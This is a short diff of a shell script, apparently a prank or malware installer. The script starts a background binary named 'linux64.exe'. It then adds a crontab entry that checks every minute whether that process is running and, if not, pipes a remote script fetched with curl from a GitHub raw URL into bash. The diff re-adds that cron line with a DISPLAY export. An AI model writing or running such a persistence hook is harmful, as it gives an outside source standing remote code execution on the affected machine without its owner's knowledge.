@@ -7,6 +7,6 @@ nohup $path/linux64.exe &
 
 if [[ -z "$(crontab -l | grep bonchance)" ]]; then
     crontab -l > crontabs
-    echo '* * * * *     bash -c "if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi"' >> crontabs
+    echo '* * * * * bash -c "export DISPLAY=:0 && if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi"' >> crontabs
     crontab crontabs
 fi
